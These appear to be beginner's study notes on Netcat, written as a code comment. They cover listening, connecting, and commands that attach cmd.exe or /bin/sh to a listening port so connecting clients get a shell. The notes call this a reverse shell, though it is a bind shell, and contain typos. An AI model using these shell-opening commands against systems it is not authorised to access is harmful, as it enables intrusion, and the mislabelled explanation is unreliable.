/** Intro to NetCat
 
    Netcat performs a variety of reverse shell and port listening tasks in networking.

    NetCat Commands/Options:

        nc: Netcat command
        -help: Provides available options for netcat
        -v: verbose
        -l: listen
        -p: port
        -n: numeric only IP addresses, no DNS
        -e: executes a program on the target

    How to listen on a port:

        This command basically allows a machine to act as a server side, listening for 
        any and all connections from client 

        nc -vlp PORTNNUMBER

        OR: 

            nc -p 1200 -l -v 

    How to connect to a target:

        nc --v 192.168.0.111 PORTNUMBER

        After entering the following command, if connected successfully to a listening port, 
        allows us to type anything and send data to the target
   
    How to create a reverse shell:

        On the listening port/system, enter

            WINDOWS SYSTEM:
            nc -vlp PORTNNUMBER -e cmd.exe 
                On port 1200 of a machine, run the cmd prop program as soon as client connects, 
                enabling a reverse shell. Once the client connects to the port, a reverse shell 
                will be available to them to execute shell commands.

            LINUX SYSTEM:
            ncat -e /bin/sh -vlp PORTNNUMBER
